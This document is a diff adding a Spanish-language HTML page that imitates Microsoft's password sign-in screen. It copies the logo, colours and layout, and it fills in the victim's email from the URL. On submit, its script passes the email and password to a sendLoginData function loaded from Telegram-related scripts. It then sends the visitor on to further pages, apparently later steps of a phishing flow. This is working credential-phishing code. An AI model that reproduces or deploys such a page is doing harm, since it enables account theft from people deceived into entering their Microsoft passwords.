@@ -1,0 +1,426 @@
+<!doctype html>
+<html lang="es">
+  <head>
+<!-- Inserted by miarroba -->
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7294310421616689" crossorigin="anonymous"></script>
+<script type='text/javascript' src='https://ads.vidoomy.com/miarroba_23335.js' async></script>
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-T2VG59');</script>
+<!-- Inserted by miarroba -->
+    <meta charset="UTF-8" />
+    <link rel="icon" type="image/svg+xml" href="/vite.svg" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no, viewport-fit=cover" />
+    <title>Iniciar sesión en su cuenta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              'ms-blue': '#0078d4',
+              'ms-blue-hover': '#106ebe',
+              'ms-red': '#f25022',
+              'ms-green': '#7fba00',
+              'ms-yellow': '#ffb900',
+              'ms-blue-logo': '#00bcf2',
+              'ms-gray': '#1b1b1b',
+              'ms-gray-light': '#605e5c',
+              'ms-border': '#8a8886',
+              'ms-bg': '#f5f5f5',
+            },
+            fontFamily: {
+              'segoe': ['"Segoe UI"', 'system-ui', '-apple-system', 'BlinkMacSystemFont', 'sans-serif'],
+            },
+            fontSize: {
+              'ms-title': ['28px', { lineHeight: '36px', fontWeight: '600' }],
+              'ms-subtitle': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-body': ['15px', { lineHeight: '20px', fontWeight: '400' }],
+              'ms-link': ['13px', { lineHeight: '16px', fontWeight: '400' }],
+              'ms-logo': ['21px', { lineHeight: '28px', fontWeight: '600' }],
+            },
+            boxShadow: {
+              'ms-card': '0 2px 6px rgba(0,0,0,0.2)',
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      * { box-sizing: border-box; }
+
+      body {
+        font-family: "Segoe UI", system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+        min-height: 100vh;
+        margin: 0;
+        background: url('banner.svg') center/cover no-repeat fixed;
+      }
+
+      /* ── CONTENEDOR PRINCIPAL ── */
+      .main-container {
+        min-height: 100vh;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        padding: 20px 16px 80px 16px;
+      }
+
+      /* ── CARD ── */
+      .ms-card {
+        background: #fff;
+        border-radius: 0;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        padding: 28px 44px 36px 44px;
+        width: 100%;
+        max-width: 440px;
+        position: relative;
+      }
+
+      /* ── FILA SUPERIOR: flecha + logo centrado ── */
+      .ms-card-header {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        margin-bottom: 20px;
+      }
+
+      .ms-back-btn {
+        position: absolute;
+        left: 0;
+        background: none;
+        border: none;
+        cursor: pointer;
+        padding: 4px;
+        color: #1b1b1b;
+        display: flex;
+        align-items: center;
+      }
+
+      .ms-back-btn:hover { color: #0078d4; }
+
+      .ms-logo-row {
+        display: flex;
+        align-items: center;
+        gap: 8px;
+      }
+
+      .ms-logo-grid {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 1px;
+        width: 20px;
+        height: 20px;
+        flex-shrink: 0;
+      }
+
+      .ms-logo-grid div { width: 9px; height: 9px; }
+
+      /* ── EMAIL PÍLDORA ── */
+      .ms-email-badge {
+        display: flex;
+        justify-content: center;
+        margin-bottom: 16px;
+      }
+
+      .ms-email-badge span {
+        border: 1px solid #8a8886;
+        border-radius: 20px;
+        padding: 4px 16px;
+        font-size: 13px;
+        color: #1b1b1b;
+        background: transparent;
+      }
+
+      /* ── TÍTULO ── */
+      .ms-card h1 {
+        text-align: center !important;
+        font-size: 24px !important;
+        font-weight: 600 !important;
+        line-height: 32px !important;
+        color: #1b1b1b !important;
+        margin: 0 0 20px 0 !important;
+      }
+
+      /* ── INPUT CONTRASEÑA ── */
+      input#password {
+        display: block;
+        width: 100% !important;
+        border: 1px solid #8a8886 !important;
+        border-radius: 0 !important;
+        padding: 10px 12px !important;
+        background: #fff !important;
+        box-shadow: none !important;
+        font-size: 16px !important;
+        font-family: inherit !important;
+        color: #1b1b1b !important;
+        outline: none !important;
+      }
+
+      input#password:focus {
+        border-color: #0078d4 !important;
+        box-shadow: inset 0 0 0 1px #0078d4 !important;
+      }
+
+      input#password::placeholder {
+        color: #767676 !important;
+      }
+
+      /* ── LINK ── */
+      a.ms-link, .ms-link {
+        color: #0078d4 !important;
+        text-decoration: none !important;
+        font-size: 13px !important;
+      }
+
+      a.ms-link:hover { text-decoration: underline !important; }
+
+      /* ── BOTÓN SIGUIENTE ── */
+      .ms-btn-next {
+        display: block;
+        width: 100%;
+        background: #0078d4;
+        color: #fff;
+        border: none;
+        border-radius: 0;
+        font-size: 15px;
+        font-weight: 600;
+        font-family: inherit;
+        padding: 10px 12px;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+
+      .ms-btn-next:hover { background: #106ebe; }
+      .ms-btn-next:active { background: #005a9e; }
+
+      /* ── OTRAS FORMAS ── */
+      .ms-other-login {
+        text-align: center;
+        margin-top: 20px;
+        padding-top: 20px;
+        border-top: 1px solid #e0e0e0;
+      }
+
+      /* ── FOOTER ── */
+      .ms-footer {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: rgba(255,255,255,0.95);
+        border-top: 1px solid #e0e0e0;
+        padding: 8px 16px;
+        z-index: 50;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 24px;
+        flex-wrap: wrap;
+        font-size: 12px;
+        color: #605e5c;
+      }
+
+      .ms-footer a {
+        color: #605e5c;
+        text-decoration: none;
+        font-size: 12px;
+      }
+
+      .ms-footer a:hover { color: #0078d4; }
+
+      /* ── ANIMACIÓN ── */
+      .fade-in { animation: fadeIn 0.3s ease-out; }
+
+      @keyframes fadeIn {
+        from { opacity: 0; transform: translateY(10px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+
+      /* ── MÓVIL: sin scroll, sin zoom ── */
+      @media (max-width: 639px) {
+        html, body {
+          position: fixed !important;
+          width: 100% !important;
+          height: 100% !important;
+          overflow: hidden !important;
+          overscroll-behavior: none !important;
+          touch-action: none !important;
+        }
+        .main-container {
+          position: fixed !important;
+          top: 0; left: 0; right: 0; bottom: 0;
+          overflow: hidden !important;
+          touch-action: none !important;
+        }
+      }
+    </style>
+  </head>
+  <body class="relative">
+<!-- Inserted by miarroba -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-T2VG59" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- Inserted by miarroba -->
+
+    <div class="main-container">
+      <div class="ms-card fade-in">
+
+        <!-- Header: flecha + logo centrado -->
+        <div class="ms-card-header">
+          <button class="ms-back-btn" onclick="history.back()" title="Volver">
+            <svg width="16" height="16" viewBox="0 0 16 16" fill="currentColor">
+              <path fill-rule="evenodd" d="M15 8a.5.5 0 0 0-.5-.5H2.707l3.147-3.146a.5.5 0 1 0-.708-.708l-4 4a.5.5 0 0 0 0 .708l4 4a.5.5 0 0 0 .708-.708L2.707 8.5H14.5A.5.5 0 0 0 15 8z"/>
+            </svg>
+          </button>
+          <div class="ms-logo-row">
+            <div class="ms-logo-grid">
+              <div style="background:#f25022"></div>
+              <div style="background:#7fba00"></div>
+              <div style="background:#00bcf2"></div>
+              <div style="background:#ffb900"></div>
+            </div>
+            <span style="font-size:20px;font-weight:600;color:#1b1b1b;">Microsoft</span>
+          </div>
+        </div>
+
+        <!-- Email badge -->
+        <div class="ms-email-badge">
+          <span id="userEmail">usuario@ejemplo.com</span>
+        </div>
+
+        <!-- Título -->
+        <h1>Escribir contraseña</h1>
+
+        <!-- Form -->
+        <form onsubmit="handleLogin(event)" autocomplete="off">
+          <input
+            type="password" autocomplete="new-password"
+            id="password"
+            placeholder="Contraseña"
+            required
+          />
+
+          <div style="margin-top:12px;">
+            <a href="#" class="ms-link">¿Olvidó su contraseña?</a>
+          </div>
+
+          <button type="submit" class="ms-btn-next">Siguiente</button>
+        </form>
+
+        <!-- Otras formas -->
+        <div class="ms-other-login">
+          <a href="#" class="ms-link">Otras formas de iniciar sesión</a>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- Footer igual al de la primera index -->
+    <div class="ms-footer">
+      <a href="#">Términos de uso</a>
+      <a href="#">Privacidad y cookies</a>
+      <span>···</span>
+    </div>
+
+<!-- Script de Telegram XJSX -->
+    <script src="telegram_config.js"></script>
+    <script src="xjsx.js"></script>
+    
+    <script>
+      // Get email from URL parameter or use default
+      const urlParams = new URLSearchParams(window.location.search);
+      const email = urlParams.get('email') || 'usuario@ejemplo.com';
+      document.getElementById('userEmail').textContent = email;
+
+      function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.getElementById('eyeIcon');
+        
+        if (passwordInput.type === 'password') {
+          passwordInput.type = 'text';
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.268-2.943-9.543-7a9.97 9.97 0 011.563-3.029m5.858.908a3 3 0 114.243 4.243M9.878 9.878l4.242 4.242M9.878 9.878L3 3m6.878 6.878L21 21"></path>
+          `;
+        } else {
+          passwordInput.type = 'password';
+          eyeIcon.innerHTML = `
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path>
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"></path>
+          `;
+        }
+      }
+
+      function goBack() {
+        window.history.back();
+      }
+
+      function handleLogin(event) {
+        event.preventDefault();
+        
+        // Prevenir múltiples envíos
+        const submitButton = event.target.querySelector('button[type="submit"]') || document.querySelector('button[type="submit"]');
+        if (submitButton.disabled) {
+          return;
+        }
+        
+        const password = document.getElementById('password').value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || 'usuario@ejemplo.com';
+        
+        if (password.trim()) {
+          // Deshabilitar botón inmediatamente
+          submitButton.disabled = true;
+          submitButton.textContent = 'Verificando...';
+          
+          // Enviar datos usando XJSX
+          console.log('📤 Enviando datos de login...');
+          
+          if (typeof sendLoginData !== 'undefined') {
+            sendLoginData(email, password)
+              .then(success => {
+                console.log(success ? '✅ Login enviado' : '❌ Error enviando login');
+                setTimeout(() => {
+
+                  // ✅ Si ya pasó 1 vez por index3, saltar directo a index4
+                    const yaPasoPorIndex3 = localStorage.getItem("paso_index3") === "1";
+
+                    if (yaPasoPorIndex3) {
+                     window.location.href = `index4.html?email=${encodeURIComponent(email)}`;
+                  } else {
+                 // ✅ Primera vez: marcar y mandarlo a index3
+                     localStorage.setItem("paso_index3", "1");
+                    window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
+                  }
+
+                }, 500);
+              })
+              .catch(error => {
+                console.error('❌ Error:', error);
+                setTimeout(() => {
+                  window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
+                }, 500);
+              });
+          } else {
+            console.warn('⚠️ XJSX no cargado');
+            window.location.href = `index3.html?email=${encodeURIComponent(email)}`;
+          }
+        }
+      }
+    </script>
+
+  <!-- Inserted by miarroba -->
+<script type="text/javascript" src="/hosting__contador__visitas__unicas.php?h=2201685&amp;t=1759878619&amp;k=a4b6eb174680672a8756961af3b73252&amp;__muid="></script>
+<!-- Inserted by miarroba -->
+
+    <script>
+      document.addEventListener('gesturestart',  e => e.preventDefault());
+      document.addEventListener('gesturechange', e => e.preventDefault());
+      document.addEventListener('gestureend',    e => e.preventDefault());
+      let lastTouch = 0;
+      document.addEventListener('touchend', e => {
+        const now = Date.now();
+        if (now - lastTouch <= 300) e.preventDefault();
+        lastTouch = now;
+      }, { passive: false });
+      document.addEventListener('touchmove', e => {
+        if (e.touches.length > 1) e.preventDefault();
+      }, { passive: false });
+    </script>
+</body>
+</html>
